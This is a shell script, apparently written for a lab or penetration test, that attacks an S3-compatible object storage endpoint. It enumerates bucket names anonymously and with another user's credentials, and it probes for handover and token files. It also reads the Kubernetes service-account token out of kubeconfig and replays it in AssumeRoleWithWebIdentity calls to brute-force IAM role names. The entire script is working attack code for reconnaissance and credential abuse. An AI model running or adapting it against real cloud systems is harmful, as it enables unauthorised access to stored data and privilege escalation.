set +e
E=https://objects.keplerops.test
echo "== anon random bucket names (baseline) =="
for b in zzq-random-9182 qqq-nope-abc totallyfakebucket9 tmp-bucket-x1; do
  code=$(curl -sSk -m 6 -o /tmp/rb -w '%{http_code}' "$E/$b?list-type=2")
  echo "-- $b -> $code $(head -c 200 /tmp/rb)"
done
echo "== anon candidate buckets classification =="
for b in fieldkest-workspaces fieldlink-exports support-exports support-export fieldkest-support fieldkest-support-exports support fieldkest-handovers fieldkest-archive fieldkest-records fieldkest-customer-records fieldkest-workloads workload-identities fieldkest-identities notebooks workspace-exports; do
  code=$(curl -sSk -m 6 -o /tmp/rb -w '%{http_code}' "$E/$b?list-type=2")
  msg=$(grep -o '<Code>[^<]*' /tmp/rb | head -1)
  echo "-- $b -> $code $msg"
done
echo "== rowan creds candidate buckets =="
A="aws --endpoint-url $E s3 ls"
for b in support-exports support-export fieldkest-support support fieldkest-support-exports fieldkest-handovers fieldkest-archive fieldkest-records fieldkest-workloads fieldkest-workspaces; do
  out=$($A "s3://$b" 2>&1 | tr '\n' ' ')
  echo "-- $b -> $out"
done
echo "== rowan creds specific keys in fieldlink-exports =="
for k in support/EXP-2841/handover.json exports/EXP-2841/handover.json handover.json support/handover.json workloads/token.json identities/workload.json; do
  code=$(curl -sSk -m 6 -o /tmp/k -w '%{http_code}' "$E/fieldlink-exports/$k")
  echo "-- $k -> $code $(grep -o '<Code>[^<]*' /tmp/k|head -1)"
done
echo "== STS role name enumeration (does role exist?) =="
JWT=$(kubectl config view --raw -o jsonpath='{.users[0].user.token}')
enc=$(python3 -c 'import urllib.parse,sys;print(urllib.parse.quote(sys.argv[1],safe=""))' "$JWT")
for r in fieldkest-workspace workspace-reader workspace-writer support-record record-reader customer-record data-reader objects-reader fieldlink-reader fieldlink-workspace fieldkest-reader export-reader export-writer support-reader support-writer workload workload-identity fieldlink-workload fieldkest-workload report-runner export-runner diagnostics arwc TEN-ARWC-019 TEN-ARWC-047 CRR-OG2; do
  out=$(curl -sSk -m 6 -X POST "$E/?Action=AssumeRoleWithWebIdentity&Version=2011-06-15&WebIdentityToken=$enc&RoleSessionName=probe&RoleArn=arn:aws:iam::000000000000:role/$r" | grep -o '<Message>[^<]*' | head -1)
  echo "-- $r -> $out"
done
